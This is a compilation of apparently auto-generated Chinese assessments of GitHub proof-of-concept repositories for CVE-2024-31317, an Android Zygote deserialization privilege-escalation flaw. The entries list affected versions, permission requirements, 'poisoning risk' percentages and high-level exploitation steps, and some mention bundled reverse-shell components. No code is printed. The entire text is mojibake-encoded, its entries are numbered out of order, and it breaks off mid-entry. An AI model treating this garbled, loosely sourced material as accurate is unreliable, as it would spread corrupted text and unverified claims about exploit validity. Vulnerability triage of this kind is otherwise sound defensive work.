CVE-2024-31317æ˜¯ä¸€ä¸ªAndroidç³»ç»Ÿä¸­çš„ç‰¹æƒæå‡æ¼æ´ï¼Œå­˜åœ¨äºZygoteProcess.javaçš„å¤šä¸ªå‡½æ•°ä¸­ã€‚ç”±äºä¸å®‰å…¨çš„ååºåˆ—åŒ–ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ‹¥æœ‰`WRITE_SECURE_SETTINGS`æƒé™çš„åº”ç”¨ç¨‹åºï¼Œä»¥ä»»ä½•åº”ç”¨ç¨‹åºçš„èº«ä»½æ‰§è¡Œä»£ç ï¼Œå¯¼è‡´æœ¬åœ°ææƒã€‚æ ¹æ®NVDçš„æè¿°ï¼Œè¯¥æ¼æ´çš„CVSS 3.1è¯„åˆ†ä¸º7.8ï¼Œå±äºé«˜å±æ¼æ´ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**
æ”»å‡»è€…åˆ©ç”¨`WRITE_SECURE_SETTINGS`æƒé™ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„åºåˆ—åŒ–æ•°æ®ï¼Œä¼ é€’ç»™Zygoteè¿›ç¨‹å¤„ç†ã€‚Zygoteè¿›ç¨‹åœ¨ååºåˆ—åŒ–è¿™äº›æ•°æ®æ—¶ï¼Œç”±äºç¼ºä¹è¶³å¤Ÿçš„å®‰å…¨æ£€æŸ¥ï¼Œå¯¼è‡´å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ï¼Œä»è€Œæå‡æƒé™åˆ°å…¶ä»–åº”ç”¨ã€‚

**POCä»£ç åˆ†æï¼š**
æä¾›çš„POCä»£ç åŒ…å«`build.gradle`ã€`gradle.properties`å’Œ`gradlew`æ–‡ä»¶ï¼Œè¿™æ˜¯ä¸€ä¸ªæ ‡å‡†çš„Android Gradleé¡¹ç›®çš„åŸºæœ¬æ–‡ä»¶ã€‚å®ƒä»¬ä¸»è¦ç”¨äºæ„å»ºAndroidåº”ç”¨ç¨‹åºï¼Œæœ¬èº«ä¸åŒ…å«ç›´æ¥åˆ©ç”¨CVE-2024-31317æ¼æ´çš„ä»£ç ã€‚è¿™ä¸ªåº“æœ¬èº«åªæ˜¯å®‰å“é¡¹ç›®gradleæ„å»ºæ–‡ä»¶ï¼Œè¦åˆ©ç”¨æ¼æ´è¿˜éœ€è¦æ›´å¤šä¿¡æ¯ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**
è™½ç„¶æä¾›çš„ä»£ç ç‰‡æ®µæœ¬èº«ä¸ç›´æ¥æ„æˆæ¼æ´åˆ©ç”¨ï¼Œä½†ä½œä¸ºä¸€ä¸ªAndroidé¡¹ç›®ï¼Œå®ƒå¯ä»¥è¢«ç”¨æ¥æ„å»ºåŒ…å«æ¼æ´åˆ©ç”¨ä»£ç çš„æ¶æ„åº”ç”¨ã€‚`gradlew`è„šæœ¬å¯èƒ½è¢«ä¿®æ”¹ä¸ºåŒ…å«ä¸‹è½½å’Œæ‰§è¡Œæ¶æ„ä»£ç çš„æ­¥éª¤ï¼Œæˆ–è€…`build.gradle`æ–‡ä»¶å¯èƒ½è¢«ä¿®æ”¹ä¸ºå¼•å…¥åŒ…å«æ¶æ„ä»£ç çš„ä¾èµ–é¡¹ã€‚è€ƒè™‘åˆ°è¿™ç§å¯èƒ½æ€§ï¼ŒæŠ•æ¯’é£é™©ä¼°è®¡ä¸º10%ã€‚è¿™ä¸ªæ¦‚ç‡ä¸»è¦æ¥è‡ªäºä½œè€…å¯èƒ½ä¼šåœ¨æ„å»ºè¿‡ç¨‹ä¸­æ·»åŠ æ¶æ„ä¾èµ–æˆ–è€…æ‰§è¡Œæ¶æ„è„šæœ¬ï¼Œä½†æ˜¯ä»ç›®å‰çš„ä»£ç æ¥çœ‹ï¼Œå¹¶æ²¡æœ‰ç›´æ¥çš„è¯æ®è¡¨æ˜å­˜åœ¨æ¶æ„ä»£ç ã€‚

**é¡¹ç›®åœ°å€:** [jmywh1/CVE-2024-31317](https://github.com/jmywh1/CVE-2024-31317)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-31317](https://nvd.nist.gov/vuln/detail/CVE-2024-31317)

---

## POC #7

**æ¥æº**: [CVE-2024-31317-mianliupindao_CVE-2024-31317-PoC-Deployer.md](../2024/CVE-2024-31317-mianliupindao_CVE-2024-31317-PoC-Deployer.md)

## CVE-2024-31317 Android ZygoteProcess ååºåˆ—åŒ–æ¼æ´

**æ¼æ´ç¼–å·:** CVE-2024-31317

**æ¼æ´ç±»å‹:** ååºåˆ—åŒ–æ¼æ´å¯¼è‡´ææƒ

**å½±å“åº”ç”¨:** Android

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœ¬åœ°ææƒåˆ°ä»»æ„åº”ç”¨æƒé™

**å½±å“ç‰ˆæœ¬:** Android 12, 12L, 13, 14

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦Useræ‰§è¡Œæƒé™ï¼Œæ— éœ€ç”¨æˆ·äº¤äº’ï¼Œéœ€è¦WRITE_SECURE_SETTINGSæƒé™ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 70%

## è¯¦æƒ…

CVE-2024-31317 æ˜¯ä¸€ä¸ª Android æ“ä½œç³»ç»Ÿä¸­çš„æƒé™æå‡æ¼æ´ï¼Œå­˜åœ¨äº `ZygoteProcess.java` çš„å¤šä¸ªå‡½æ•°ä¸­ã€‚ç”±äºä¸å®‰å…¨çš„ååºåˆ—åŒ–ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ `WRITE_SECURE_SETTINGS` æƒé™æ‰§è¡Œä»»æ„åº”ç”¨ç¨‹åºçš„ä»£ç ã€‚è¿™å¯èƒ½å¯¼è‡´æœ¬åœ°æƒé™æå‡ã€‚ä»æœç´¢å¼•æ“ç»“æœæ¥çœ‹ï¼Œè¿™ä¸ªæ¼æ´è¢«è®¤ä¸ºæ˜¯è¿‘å¹´æ¥æœ€æœ‰ä»·å€¼çš„Androidç”¨æˆ·ç©ºé—´æ¼æ´ä¹‹ä¸€ï¼Œå¹¶ä¸”æœ‰å…¬å¼€çš„åˆ©ç”¨æ–¹æ³•ã€‚æ¼æ´åˆ©ç”¨ä»£ç  `Android_Zygote_Research_Kit.sh` è„šæœ¬æ—¨åœ¨å¸®åŠ©ç ”ç©¶äººå‘˜å¤ç°å’Œåˆ†ææ­¤æ¼æ´ã€‚å®ƒåŒ…å«ä¸€ä¸ªåå‘ shell ç¨‹åºï¼ˆ`reverse_shell.c`ï¼‰ï¼Œä¸€ä¸ª payload æ–‡ä»¶ï¼ˆ`payload.txt`ï¼‰ï¼Œä¸€ä¸ªç¼–è¯‘è„šæœ¬ï¼ˆ`compile.sh`ï¼‰ï¼Œä»¥åŠç›¸å…³çš„è¯´æ˜æ–‡æ¡£ã€‚è„šæœ¬å°è¯•åˆ›å»ºä¸€ä¸ªç›‘å¬ç‰¹å®šç«¯å£çš„åå‘ shellï¼Œè¿™æœ¬èº«å°±å­˜åœ¨ä¸€å®šçš„é£é™©ã€‚è„šæœ¬ä¸­åå‘è¿æ¥çš„ç¡¬ç¼–ç ç«¯å£å’ŒIPåœ°å€ï¼Œæ„å‘³ç€æ”»å‡»è€…å¯ä»¥æ§åˆ¶å—å®³è®¾å¤‡çš„åå‘è¿æ¥ã€‚è€ƒè™‘åˆ°è„šæœ¬çš„ç›®çš„æ˜¯ä¸ºäº†æ–¹ä¾¿ç ”ç©¶äººå‘˜ä½¿ç”¨ï¼Œå­˜åœ¨ä¸€ç§æŠ•æ¯’é£é™©ï¼Œæ”»å‡»è€…å¯èƒ½é€šè¿‡ä¿®æ”¹åå‘ shell çš„ä»£ç ï¼Œåœ¨å—å®³è€…ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹æ¤å…¥æ¶æ„ä»£ç ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥ä¿®æ”¹ `reverse_shell.c` ä½¿å…¶åœ¨å»ºç«‹è¿æ¥åæ‰§è¡ŒæŸäº›æ¶æ„æ“ä½œï¼Œæˆ–è€…å°†æ”¶é›†åˆ°çš„ä¿¡æ¯å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚ç”±äºè¿™ä¸ªæ¼æ´å…è®¸æ‰§è¡Œä»»æ„åº”ç”¨çš„ä»£ç ï¼Œå¦‚æœè¢«æ¶æ„åˆ©ç”¨ï¼Œå¯ä»¥é€ æˆå¾ˆå¤§çš„å±å®³ã€‚

åˆ©ç”¨æ–¹å¼ï¼š

1.  **æƒé™è·å–:** æ”»å‡»è€…éœ€è¦å…ˆè·å¾— `WRITE_SECURE_SETTINGS` æƒé™ã€‚
2.  **æ„é€ æ¶æ„æ•°æ®:**  æ„é€ åŒ…å«æ¶æ„ä»£ç çš„ååºåˆ—åŒ–æ•°æ®ã€‚
3.  **åˆ©ç”¨ ZygoteProcess:**  å°†æ¶æ„æ•°æ®ä¼ é€’ç»™å­˜åœ¨æ¼æ´çš„ `ZygoteProcess.java` å‡½æ•°ã€‚
4.  **ä»£ç æ‰§è¡Œ:**  åˆ©ç”¨ Zygote è¿›ç¨‹çš„æƒé™æ‰§è¡Œä»»æ„ä»£ç ï¼Œå®ç°æƒé™æå‡ã€‚

è¯¥`Android_Zygote_Research_Kit.sh`è„šæœ¬åªæ˜¯ä¸€ä¸ªè¾…åŠ©åˆ©ç”¨å·¥å…·ï¼Œç”¨äºç”Ÿæˆæ‰€éœ€çš„æ–‡ä»¶ï¼Œå¹¶æ²¡æœ‰æ¼æ´åˆ©ç”¨çš„æ ¸å¿ƒä»£ç ã€‚

**é¡¹ç›®åœ°å€:** [mianliupindao/CVE-2024-31317-PoC-Deployer](https://github.com/mianliupindao/CVE-2024-31317-PoC-Deployer)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-31317](https://nvd.nist.gov/vuln/detail/CVE-2024-31317)

---



---

## POC #2

**æ¥æº**: [CVE-2024-31317-JadeByteZen_CVE-2024-31317-PoC-Deployer.md](../2024/CVE-2024-31317-JadeByteZen_CVE-2024-31317-PoC-Deployer.md)

## CVE-2024-31317-Android Zygote Deserialization

**æ¼æ´ç¼–å·:** CVE-2024-31317

**æ¼æ´ç±»å‹:** æƒé™æå‡

**å½±å“åº”ç”¨:** Android

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œå’Œæƒé™æå‡

**å½±å“ç‰ˆæœ¬:** Android 12, 12L, 13, 14

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç”¨æˆ·æ‰§è¡Œæƒé™(User execution privileges needed)ï¼Œæ— éœ€ç”¨æˆ·äº¤äº’

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-31317 æ¼æ´å­˜åœ¨äºAndroidç³»ç»Ÿçš„Zygoteè¿›ç¨‹ä¸­ï¼Œç”±äºä¸å®‰å…¨çš„ååºåˆ—åŒ–å¯¼è‡´å¯ä»¥é€šè¿‡`WRITE_SECURE_SETTINGS`æƒé™å®ç°ä»£ç æ‰§è¡Œã€‚è¯¥æ¼æ´å½±å“Android 12ã€12Lã€13å’Œ14ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´æå‡æƒé™ï¼Œåœ¨å—å½±å“çš„è®¾å¤‡ä¸Šä»¥ä»»ä½•åº”ç”¨ç¨‹åºçš„èº«ä»½æ‰§è¡Œä»£ç ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **ä¸å®‰å…¨çš„ååºåˆ—åŒ–ï¼š**  `ZygoteProcess.java`ä¸­çš„å¤šä¸ªå‡½æ•°å­˜åœ¨ä¸å®‰å…¨çš„ååºåˆ—åŒ–æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„åºåˆ—åŒ–æ•°æ®ï¼Œåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­æ‰§è¡Œä»»æ„ä»£ç ã€‚
2.  **æƒé™æå‡ï¼š** æ”»å‡»è€…éœ€è¦`WRITE_SECURE_SETTINGS`æƒé™ï¼Œè¿™ä¸ªæƒé™é€šå¸¸éœ€è¦é€šè¿‡å…¶ä»–æ¼æ´æˆ–è€…é€šè¿‡æ¬ºéª—ç”¨æˆ·æˆäºˆã€‚å¦‚æœæ”»å‡»è€…æ‹¥æœ‰äº†è¿™ä¸ªæƒé™,ä»–ä»¬å°±å¯ä»¥é€šè¿‡Zygoteè¿›ç¨‹æ‰§è¡Œä»£ç ï¼Œæ¨¡æ‹Ÿä»»ä½•appçš„èº«ä»½ã€‚
3.  **ä»£ç æ‰§è¡Œï¼š**  é€šè¿‡åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ç›®æ ‡è®¾å¤‡ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚

**POCæœ‰æ•ˆæ€§åˆ†æï¼š**

æä¾›çš„`Android_Zygote_Research_Kit.sh`è„šæœ¬åŒ…å«ä»¥ä¸‹ç»„ä»¶ï¼š

*   `reverse_shell.c`ï¼šä¸€ä¸ªåå‘shellç¨‹åºï¼Œç”¨äºåœ¨ç›®æ ‡è®¾å¤‡ä¸Šå»ºç«‹ä¸æ”»å‡»è€…çš„è¿æ¥ã€‚
*   `payload91011.txt` å’Œ `payload1213.txt`ï¼šé’ˆå¯¹ä¸åŒAndroidç‰ˆæœ¬çš„æ¼æ´åˆ©ç”¨payloadã€‚
*   `compile.sh`ï¼šç”¨äºç¼–è¯‘åå‘shellç¨‹åºçš„è„šæœ¬ã€‚
*   `README.txt` å’Œ `CVE-2024-31317.txt`ï¼šæä¾›æ¼æ´åˆ©ç”¨çš„è¯´æ˜å’ŒæŠ€æœ¯åˆ†æã€‚

è¯¥è„šæœ¬é€šè¿‡ç”Ÿæˆæ¶æ„payloadå¹¶ç»“åˆåå‘shellç¨‹åºï¼Œå®ç°äº†å¯¹CVE-2024-31317æ¼æ´çš„åˆ©ç”¨ã€‚å› æ­¤ï¼Œæä¾›çš„POCä»£ç è¢«è®¤ä¸ºæ˜¯æœ‰æ•ˆçš„ï¼Œå¯ä»¥ç”¨æ¥éªŒè¯å’Œåˆ©ç”¨è¯¥æ¼æ´ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

è™½ç„¶è„šæœ¬ä¸»è¦ç›®çš„æ˜¯ä¸ºäº†æ¼æ´ç ”ç©¶å’Œåˆ©ç”¨ï¼Œä½†ä»ç„¶å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼š

*   **åå‘Shellçš„æ½œåœ¨é£é™©ï¼š** `reverse_shell.c`æœ¬èº«å¯ä»¥è¢«è§†ä¸ºä¸€ç§åé—¨ã€‚ä¸€æ—¦æˆåŠŸåˆ©ç”¨æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥è·å¾—è®¾å¤‡çš„æ§åˆ¶æƒï¼Œæ‰§è¡Œæ¶æ„æ“ä½œã€‚
*   **å…¶ä»–æ¶æ„ä»£ç æ¤å…¥é£é™©ï¼š** è„šæœ¬ä¸­å¯èƒ½åŒ…å«å…¶ä»–æœªå£°æ˜çš„æ¶æ„ä»£ç ï¼Œä¾‹å¦‚ä¿¡æ¯æ”¶é›†ã€æ¶æ„è½¯ä»¶ä¼ æ’­ç­‰ã€‚

ç»¼åˆæ¥çœ‹ï¼ŒæŠ•æ¯’é£é™©å­˜åœ¨ï¼Œä½†ä¸»è¦é£é™©é›†ä¸­åœ¨åå‘shellçš„åŠŸèƒ½ä¸Šï¼Œä»¥åŠè„šæœ¬ä½œè€…å¯èƒ½æ¤å…¥çš„æ½œåœ¨æ¶æ„ä»£ç ã€‚è€ƒè™‘åˆ°ä½œè€…å£°æ˜çš„MITå¼€æºåè®®ä»¥åŠä»£ç ä¸­æ˜æ˜¾çš„åŠŸèƒ½å®ç°ï¼ŒæŠ•æ¯’çš„å¯èƒ½æ€§è¾ƒä½ï¼Œå¤§çº¦ä¸º10%ã€‚

**é¡¹ç›®åœ°å€:** [JadeByteZen/CVE-2024-31317-PoC-Deployer](https://github.com/JadeByteZen/CVE-2024-31317-PoC-Deployer)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-31317](https://nvd.nist.gov/vuln/detail/CVE-2024-31317)

---

## POC #3

**æ¥æº**: [CVE-2024-31317-Webldix_CVE-2024-31317-PoC-Deployer.md](../2024/CVE-2024-31317-Webldix_CVE-2024-31317-PoC-Deployer.md)

## CVE-2024-31317-Android Zygote Deserialization

**æ¼æ´ç¼–å·:** CVE-2024-31317

**æ¼æ´ç±»å‹:** ç‰¹æƒæå‡

**å½±å“åº”ç”¨:** Android

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´ä»»æ„åº”ç”¨ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Android 12, 12L, 13, 14

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦`WRITE_SECURE_SETTINGS`æƒé™å’Œç”¨æˆ·æ‰§è¡Œæƒé™ï¼Œæ— éœ€ç”¨æˆ·äº¤äº’

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2024-31317æ˜¯Androidç³»ç»Ÿä¸­çš„ä¸€ä¸ªç‰¹æƒæå‡æ¼æ´ï¼Œå­˜åœ¨äº`ZygoteProcess.java`çš„å¤šä¸ªå‡½æ•°ä¸­ã€‚ç”±äºä¸å®‰å…¨çš„ååºåˆ—åŒ–ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡`WRITE_SECURE_SETTINGS`æƒé™åœ¨ä»»ä½•åº”ç”¨ä¸­æ‰§è¡Œä»£ç ã€‚æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œåˆ©ç”¨æ­¤æ¼æ´æ— éœ€ç”¨æˆ·äº¤äº’ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´åœ¨Zygoteè¿›ç¨‹ä¸­æ³¨å…¥æ¶æ„ä»£ç ï¼Œè¿›è€Œæ§åˆ¶æ–°åˆ›å»ºçš„åº”ç”¨è¿›ç¨‹ã€‚æä¾›çš„POCä»£ç çœ‹èµ·æ¥æ›´åƒä¸€ä¸ªåå‘shellçš„ç”Ÿæˆè„šæœ¬ï¼Œæœ¬èº«ä¸ç›´æ¥åŒ…å«æ¼æ´åˆ©ç”¨ä»£ç ï¼Œä½†è„šæœ¬ç”Ÿæˆçš„åå‘shellå¯ä»¥é€šè¿‡æ¼æ´åˆ©ç”¨payloadæ‰§è¡Œï¼Œé—´æ¥å®Œæˆæ¼æ´åˆ©ç”¨è¿‡ç¨‹ã€‚ æŠ•æ¯’é£é™©è¯„ä¼°ä¸º5%ï¼Œä¸»è¦æ˜¯å› ä¸ºè„šæœ¬æœ¬èº«ä¼šä»å¤–éƒ¨å¯¼å…¥payloadï¼Œå­˜åœ¨payloadè¢«æ›¿æ¢çš„é£é™©ï¼Œä¸”è„šæœ¬ä½œè€…å£°æ˜äº†å…è´£æ¡æ¬¾ï¼Œæš—ç¤ºå­˜åœ¨ä¸€å®šé£é™©ã€‚

**æœ‰æ•ˆæ€§åˆ†æï¼š**

æ ¹æ®æœç´¢ç»“æœå’Œæ¼æ´æè¿°ï¼Œæ¼æ´æ˜¯ç”±äº`ZygoteProcess.java`ä¸­å­˜åœ¨ä¸å®‰å…¨çš„ååºåˆ—åŒ–é€ æˆçš„ï¼Œé€šè¿‡`WRITE_SECURE_SETTINGS`æƒé™ï¼Œå¯ä»¥æ‰§è¡Œä»»æ„åº”ç”¨çš„ä»£ç ã€‚æä¾›çš„è„šæœ¬åˆ›å»ºäº†ä¸€ä¸ªåå‘shellï¼Œè¯¥åå‘shelléœ€è¦è¢«æ³¨å…¥åˆ°åˆ©ç”¨é“¾ä¸­ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å–`WRITE_SECURE_SETTINGS`æƒé™ï¼š** æ”»å‡»è€…éœ€è¦é¦–å…ˆè·å–`WRITE_SECURE_SETTINGS`æƒé™ã€‚è¿™å¯ä»¥é€šè¿‡å·²æœ‰çš„æ¼æ´ã€æƒé™æå‡æˆ–è€…æ¶æ„åº”ç”¨æ¥å®ç°ã€‚
2.  **æ„é€ æ¶æ„Payloadï¼š**  åˆ©ç”¨ä¸å®‰å…¨çš„ååºåˆ—åŒ–æ¼æ´ï¼Œæ„é€ æ¶æ„çš„payloadï¼Œè¯¥payloadä¼šæ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„ä»£ç ï¼Œä¾‹å¦‚ï¼Œå¯åŠ¨ä¸€ä¸ªåå‘shellã€‚
3.  **åˆ©ç”¨Zygoteè¿›ç¨‹ï¼š**  é€šè¿‡æŸç§æ–¹å¼è§¦å‘Zygoteè¿›ç¨‹æ‰§è¡ŒåŒ…å«æ¶æ„payloadçš„ååºåˆ—åŒ–æ“ä½œã€‚
4.  **ä»£ç æ‰§è¡Œï¼š**  å½“Zygoteè¿›ç¨‹ååºåˆ—åŒ–æ¶æ„æ•°æ®æ—¶ï¼Œæ”»å‡»è€…çš„ä»£ç å°†åœ¨ç›®æ ‡åº”ç”¨è¿›ç¨‹ä¸­æ‰§è¡Œï¼Œä»è€Œå®ç°æƒé™æå‡ã€‚
5.  **åå‘Shellè¿æ¥:** æ”»å‡»è€…é€šè¿‡é¢„è®¾çš„IPå’Œç«¯å£æ¥æ”¶åå‘shellï¼Œä»è€Œæ§åˆ¶è®¾å¤‡

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æä¾›çš„è„šæœ¬ä¸»è¦ç”¨äºç”Ÿæˆåå‘shellç›¸å…³çš„ä»£ç ï¼Œæœ¬èº«çœ‹èµ·æ¥æ²¡æœ‰æ˜æ˜¾çš„æ¶æ„è¡Œä¸ºã€‚ä½†éœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š

*   **Payloadçš„æ½œåœ¨é£é™©ï¼š** è¯¥è„šæœ¬ä¾èµ–äºå¤–éƒ¨æä¾›çš„payloadã€‚å¦‚æœpayloadè¢«æ›¿æ¢ä¸ºæ¶æ„ä»£ç ï¼Œåˆ™å¯èƒ½å¯¼è‡´æ›´ä¸¥é‡çš„åæœã€‚
*   **åå‘Shellé£é™©ï¼š** åå‘shellæœ¬èº«å…·æœ‰é£é™©ï¼Œå¯èƒ½è¢«ç”¨äºéæ³•ç›®çš„ï¼Œä¾‹å¦‚çªƒå–ç”¨æˆ·æ•°æ®ã€è¿œç¨‹æ§åˆ¶è®¾å¤‡ç­‰ã€‚
*   **è„šæœ¬ä½œè€…çš„å…è´£å£°æ˜:** è„šæœ¬ä½œè€…å£°æ˜äº†å…è´£æ¡æ¬¾ï¼Œæš—ç¤ºå­˜åœ¨ä¸€å®šé£é™©ã€‚

ç»¼åˆæ¥çœ‹ï¼Œè¯¥POCè„šæœ¬å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œä½†é£é™©è¾ƒä½ï¼Œä¸»è¦é›†ä¸­åœ¨payloadçš„å®‰å…¨æ€§ä»¥åŠè„šæœ¬æœ¬èº«å¯èƒ½è¢«æ»¥ç”¨ä¸Šã€‚

**é¡¹ç›®åœ°å€:** [Webldix/CVE-2024-31317-PoC-Deployer](https://github.com/Webldix/CVE-2024-31317-PoC-Deployer)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-31317](https://nvd.nist.gov/vuln/detail/CVE-2024-31317)

---

## POC #4

**æ¥æº**: [CVE-2024-31317-agg23_cve-2024-31317.md](../2024/CVE-2024-31317-agg23_cve-2024-31317.md)

## CVE-2024-31317-Android Zygote Deserialization

**æ¼æ´ç¼–å·:** CVE-2024-31317

**æ¼æ´ç±»å‹:** ç‰¹æƒæå‡

**å½±å“åº”ç”¨:** Android

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œå’Œæƒé™æå‡

**å½±å“ç‰ˆæœ¬:** 12, 12L, 13, 14

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦`WRITE_SECURE_SETTINGS`æƒé™å’Œç”¨æˆ·æ‰§è¡Œæƒé™

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-31317 æ˜¯ä¸€ä¸ª Android ç³»ç»Ÿä¸­çš„ç‰¹æƒæå‡æ¼æ´ï¼Œå­˜åœ¨äº `ZygoteProcess.java` çš„å¤šä¸ªå‡½æ•°ä¸­ã€‚ç”±äºä¸å®‰å…¨çš„ååºåˆ—åŒ–ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ‹¥æœ‰ `WRITE_SECURE_SETTINGS` æƒé™çš„åº”ç”¨æ‰§è¡Œä»»æ„ä»£ç ï¼Œæ¨¡æ‹Ÿä»»ä½•å…¶ä»–åº”ç”¨ç¨‹åºçš„èº«ä»½ã€‚

**æ¼æ´åˆ©ç”¨æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥æ¼æ´è¢«è®¤ä¸ºæ˜¯ Android ç”¨æˆ·æ€ä¸­æœ€æœ‰ä»·å€¼çš„æ¼æ´ä¹‹ä¸€ã€‚å¤šä¸ªæ¥æºï¼ˆå¦‚Metaå®‰å…¨åšå®¢ã€dawnslabã€flanker017åšå®¢ï¼‰éƒ½æä¾›äº†æ¼æ´åˆ†æå’Œåˆ©ç”¨æ–¹æ³•ï¼Œè¡¨æ˜è¯¥æ¼æ´çš„PoCæ˜¯æœ‰æ•ˆçš„ã€‚

**æŠ•æ¯’é£é™©ï¼š**
æä¾›çš„ PoC ä»£ç ä¸»è¦åŒ…å«æ¼æ´çš„è§£é‡Šã€Zygote å‚æ•°è¯´æ˜ä»¥åŠæ¨¡æ‹Ÿå™¨è®¾ç½®æŒ‡å—ï¼Œå¹¶æ²¡æœ‰æ˜æ˜¾çš„æ¶æ„ä»£ç ã€‚ä½†è€ƒè™‘åˆ°ä»£ç ä¸­å¯èƒ½å­˜åœ¨éšè—çš„åé—¨æˆ–æœªå…¬å¼€çš„åˆ©ç”¨æ–¹å¼ï¼Œä¾‹å¦‚å¯¹ç³»ç»Ÿå±æ€§çš„æ¶æ„ä¿®æ”¹ï¼Œå› æ­¤å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ã€‚é£é™©è¯„ä¼°ä¸º10%ï¼Œé£é™©è¾ƒä½ä½†ä¸å¯å¿½è§†ã€‚ä¸»è¦é£é™©ç‚¹åœ¨äºåˆ©ç”¨`system`æƒé™æ‰§è¡ŒæœªçŸ¥çš„æ“ä½œï¼Œå¯èƒ½å­˜åœ¨éšè”½çš„æ¶æ„è¡Œä¸ºã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…åˆ©ç”¨å…·æœ‰ `WRITE_SECURE_SETTINGS` æƒé™çš„åº”ç”¨ç¨‹åºã€‚
2.  é€šè¿‡æ„é€ ç‰¹å®šçš„ Zygote å¯åŠ¨å‚æ•°ï¼Œåˆ©ç”¨ä¸å®‰å…¨çš„ååºåˆ—åŒ–æ¼æ´ã€‚
3.  ä½¿ Zygote è¿›ç¨‹ä»¥ç›®æ ‡åº”ç”¨ç¨‹åºçš„ UID å’Œ SELinux ä¸Šä¸‹æ–‡å¯åŠ¨ä¸€ä¸ªæ–°çš„è¿›ç¨‹ã€‚
4.  åœ¨æ–°è¿›ç¨‹ä¸­æ‰§è¡Œæ¶æ„ä»£ç ï¼Œä»è€Œè·å¾—ç›®æ ‡åº”ç”¨ç¨‹åºçš„æƒé™ã€‚æ¯”å¦‚åˆ©ç”¨`shell`æƒé™å¯ä»¥æ‰§è¡Œadb shellå‘½ä»¤ï¼Œåˆ©ç”¨`system`æƒé™å¯ä»¥ä¿®æ”¹ç³»ç»Ÿå±æ€§ã€‚

æ€»è€Œè¨€ä¹‹ï¼Œæ¼æ´åˆ©ç”¨ä¾èµ–äºå¯¹ Zygote å¯åŠ¨å‚æ•°çš„ç²¾ç¡®æ„é€ ä»¥åŠç›®æ ‡ Android ç‰ˆæœ¬çš„ç‰¹æ€§ã€‚

**é¡¹ç›®åœ°å€:** [agg23/cve-2024-31317](https://github.com/agg23/cve-2024-31317)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-31317](https://nvd.nist.gov/vuln/detail/CVE-2024-31317)

---

## POC #5

**æ¥æº**: [CVE-2024-31317-fuhei_CVE-2024-31317.md](../2024/CVE-2024-31317-fuhei_CVE-2024-31317.md)

## CVE-2024-31317 - Android Zygote Deserialization/Command Injection

**æ¼æ´ç¼–å·:** CVE-2024-31317

**æ¼æ´ç±»å‹:** æƒé™æå‡ (Elevation of Privilege)

**å½±å“åº”ç”¨:** Android

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å®ç°æœ¬åœ°æƒé™æå‡ï¼Œä»¥ä»»æ„åº”ç”¨èº«ä»½æ‰§è¡Œä»£ç 

**å½±å“ç‰ˆæœ¬:** Android 12, 12L, 13, 14

